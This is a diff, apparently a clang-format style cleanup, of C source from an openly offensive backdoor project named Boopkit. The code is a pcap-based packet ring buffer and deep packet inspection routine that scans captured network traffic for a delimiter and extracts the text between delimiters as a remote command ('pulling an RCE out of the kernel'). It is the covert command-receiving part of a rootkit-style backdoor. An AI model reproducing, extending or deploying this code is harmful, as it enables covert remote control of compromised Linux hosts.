@@ -26,14 +26,13 @@
 #include <netinet/ip.h>
 #include <pcap.h>
 #include <pthread.h>
+#include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <stdlib.h>
 // clang-format off
 #include "dpi.h"
 #include "common.h"
 // clang-format on
-
 
 //--- [ Header ] ---
 
@@ -49,28 +48,28 @@ typedef struct xcap_ip_packet {
 
 // xcap_ring_buffer is the main thread safe packet ring buffer
 xcap_ip_packet *xcap_ring_buffer[XCAP_BUFFER_SIZE];
-int xcap_pos = 0;     // The position of the ring buffer to write
-int xcap_collect = 1; // While (xcap_collect) { /* events */ }
+int xcap_pos = 0;      // The position of the ring buffer to write
+int xcap_collect = 1;  // While (xcap_collect) { /* events */ }
 pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
 
 //--- [ Header ] ---
 
-int rce_filter(char *raw, char *rce){
+int rce_filter(char *raw, char *rce) {
   char *target = NULL;
   char *start, *end;
-  start = strstr( raw, BOOPKIT_RCE_DELIMITER);
-  if (start){
+  start = strstr(raw, BOOPKIT_RCE_DELIMITER);
+  if (start) {
     start += strlen(BOOPKIT_RCE_DELIMITER);
-    end = strstr( start, BOOPKIT_RCE_DELIMITER);
-    if (end){
+    end = strstr(start, BOOPKIT_RCE_DELIMITER);
+    if (end) {
       target = (char *)malloc(end - start + 1);
-      memcpy( target, start, end - start );
+      memcpy(target, start, end - start);
       target[end - start] = '\0';
     }
   }
-  if (target){
+  if (target) {
     strncpy(rce, target, strlen(target));
-    free( target );
+    free(target);
     return 1;
   }
   return 0;
@@ -79,27 +78,27 @@ int rce_filter(char *raw, char *rce){
 void xpack_dump(xcap_ip_packet *xpack) {
   boopprintf("  -> Dumping Raw Xpack:\n");
   unsigned char *packet = xpack->packet;
-  for (int j = 0; j < xpack->header->caplen; j++){
+  for (int j = 0; j < xpack->header->caplen; j++) {
     boopprintf("%c", packet[j]);
   }
   boopprintf("\n");
 }
 
-void snapshot_dump(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]){
+void snapshot_dump(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
   boopprintf("  -> Dumping Raw Snapshot:\n");
-  for(int i = 0; i < XCAP_BUFFER_SIZE; i++) {
+  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
     struct xcap_ip_packet *xpack;
     xpack = snap[i];
     if (!xpack->captured || xpack->header->caplen < 1) {
       continue;
     }
-    xpack_dump(xpack); // printf
+    xpack_dump(xpack);  // printf
   }
 }
 
-void snapshot_free(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]){
+void snapshot_free(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
   boopprintf("  -> Free Snapshot\n");
-  for(int i = 0; i < XCAP_BUFFER_SIZE; i++) {
+  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
     struct xcap_ip_packet *xpack;
     xpack = snap[i];
     xpack->captured = 0;
@@ -116,10 +115,10 @@ void *xcap(void *v_dev_name) {
 
   // Initialize ring buffer
   for (int ii = 0; ii < XCAP_BUFFER_SIZE; ii++) {
-    struct xcap_ip_packet *xpack = malloc(sizeof (struct xcap_ip_packet));
-    xpack->packet = malloc(1); // Init to 1 byte to begin!
-    xpack->iph = malloc(sizeof (struct ip));
-    xpack->header = malloc(sizeof (struct pcap_pkthdr));
+    struct xcap_ip_packet *xpack = malloc(sizeof(struct xcap_ip_packet));
+    xpack->packet = malloc(1);  // Init to 1 byte to begin!
+    xpack->iph = malloc(sizeof(struct ip));
+    xpack->header = malloc(sizeof(struct pcap_pkthdr));
     xpack->captured = 0;
     xcap_ring_buffer[ii] = xpack;
   }
@@ -159,7 +158,7 @@ void *xcap(void *v_dev_name) {
   }
   // --- [ Filter ] ---
 
-  boopprintf("  -> xCap RingBuffer Started : %s\n",dev_name);
+  boopprintf("  -> xCap RingBuffer Started : %s\n", dev_name);
 
   /* Search for RCE */
   struct ether_header *ep;
@@ -178,17 +177,17 @@ void *xcap(void *v_dev_name) {
     packet += sizeof(struct ether_header);
     iph = (struct ip *)packet;
 
-    //boopprintf("IP Ver = %d\n", iph->ip_v);
-    //boopprintf("IP Header len = %d\n", iph->ip_hl<<2);
-    //boopprintf("[PRE] IP Source Address = %s\n", inet_ntoa(iph->ip_src));
-    //boopprintf("[PRE] IP Dest Address = %s\n", inet_ntoa(iph->ip_dst));
-    //boopprintf("IP Packet size = %d\n", len-16);
+    // boopprintf("IP Ver = %d\n", iph->ip_v);
+    // boopprintf("IP Header len = %d\n", iph->ip_hl<<2);
+    // boopprintf("[PRE] IP Source Address = %s\n", inet_ntoa(iph->ip_src));
+    // boopprintf("[PRE] IP Dest Address = %s\n", inet_ntoa(iph->ip_dst));
+    // boopprintf("IP Packet size = %d\n", len-16);
 
     if (xcap_pos == XCAP_BUFFER_SIZE) {
       // Start the ring buffer back at 0, and we have now
       // completed a "cycle"
       xcap_pos = 0;
-      cycle    = 1;
+      cycle = 1;
     }
     if (cycle) {
       // If we are cycling, free up the previous position in
@@ -202,14 +201,14 @@ void *xcap(void *v_dev_name) {
     }
 
     // Xcap Packet Ring Buffer
-    struct xcap_ip_packet *xpack = malloc(sizeof (xcap_ip_packet));
+    struct xcap_ip_packet *xpack = malloc(sizeof(xcap_ip_packet));
     xpack->packet = malloc(header.len);
-    xpack->iph = malloc(sizeof (struct ip));
-    xpack->header = malloc(sizeof (struct pcap_pkthdr));
+    xpack->iph = malloc(sizeof(struct ip));
+    xpack->header = malloc(sizeof(struct pcap_pkthdr));
     xpack->captured = 1;
     memcpy(xpack->packet, packet, header.len);
-    memcpy(xpack->iph, iph, sizeof (struct ip));
-    memcpy(xpack->header, &header, sizeof (struct pcap_pkthdr));
+    memcpy(xpack->iph, iph, sizeof(struct ip));
+    memcpy(xpack->header, &header, sizeof(struct pcap_pkthdr));
     pthread_mutex_lock(&lock);
     xcap_ring_buffer[xcap_pos] = xpack;
     pthread_mutex_unlock(&lock);
@@ -227,9 +226,9 @@ void *xcap(void *v_dev_name) {
 int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
   boopprintf("  -> Taking snapshot of network traffic.\n");
   pthread_mutex_lock(&lock);
-  for(int i = 0; i < XCAP_BUFFER_SIZE; i++) {
+  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
     struct xcap_ip_packet *from = xcap_ring_buffer[i];
-    struct xcap_ip_packet *to = malloc(sizeof (xcap_ip_packet));
+    struct xcap_ip_packet *to = malloc(sizeof(xcap_ip_packet));
 
     // packet
     to->packet = malloc(from->header->caplen);
@@ -237,14 +236,15 @@ int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
 
     // iph
     struct in_addr src_in = from->iph->ip_src;
-    //boopprintf("[SNAP] IP Source Address = %s\n", inet_ntoa(src_in));
-    //boopprintf("[SNAP] IP Dest Address = %s\n", inet_ntoa((struct in_addr) from->iph->ip_dst));
-    to->iph = malloc(sizeof (struct ip));
-    memcpy(to->iph, from->iph, sizeof (struct ip));
+    // boopprintf("[SNAP] IP Source Address = %s\n", inet_ntoa(src_in));
+    // boopprintf("[SNAP] IP Dest Address = %s\n", inet_ntoa((struct in_addr)
+    // from->iph->ip_dst));
+    to->iph = malloc(sizeof(struct ip));
+    memcpy(to->iph, from->iph, sizeof(struct ip));
 
     // header
-    to->header = malloc(sizeof (struct pcap_pkthdr));
-    memcpy(to->header, from->header, sizeof (struct pcap_pkthdr));
+    to->header = malloc(sizeof(struct pcap_pkthdr));
+    memcpy(to->header, from->header, sizeof(struct pcap_pkthdr));
 
     snap[i] = to;
   }
@@ -254,36 +254,36 @@ int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
   return 0;
 }
 
-
 // xcaprce is the main "interface" for pulling an RCE
 // out of the kernel.
 //
 // Different implementations may exist, for the first example
 // we are just using pcap.h
 int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
-  sleep(1); // Wait for the kernel to catch up
+  sleep(1);  // Wait for the kernel to catch up
   boopprintf("  -> Search xCap Ring Buffer: %s\n", search);
   xcap_ip_packet *snap[XCAP_BUFFER_SIZE];
-  snapshot(snap);   // Thread safe snapshot of the ring buffer!
-  for(int i = 0; i < XCAP_BUFFER_SIZE; i++) {
+  snapshot(snap);  // Thread safe snapshot of the ring buffer!
+  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
     struct xcap_ip_packet *xpack;
     xpack = snap[i];
     if (!xpack->captured) {
-      continue; // Ignore non captured packets in the buffer
+      continue;  // Ignore non captured packets in the buffer
     }
     unsigned char *packet = xpack->packet;
     // DPI for our RCE
     char *rce_sub;
-    rce_sub = memmem(packet, xpack->header->caplen, BOOPKIT_RCE_DELIMITER, strlen(BOOPKIT_RCE_DELIMITER));
+    rce_sub = memmem(packet, xpack->header->caplen, BOOPKIT_RCE_DELIMITER,
+                     strlen(BOOPKIT_RCE_DELIMITER));
     if (rce_sub != NULL) {
       boopprintf("  -> Found RCE xCap!\n");
       int found;
       found = rce_filter(rce_sub, rce);
-      if (found){
-        //xpack_dump(xpack);
+      if (found) {
+        // xpack_dump(xpack);
         snapshot_free(snap);
-        return 0; // Money, Success, Fame, Glamour
-      }else {
+        return 0;  // Money, Success, Fame, Glamour
+      } else {
         boopprintf("  -> [FILTER FAILURE] No RCE in xCap!\n");
         snapshot_dump(snap);
         snapshot_free(snap);
@@ -297,5 +297,3 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
   return 1;
   // return 0; // When we found our RCE!
 }
-
-
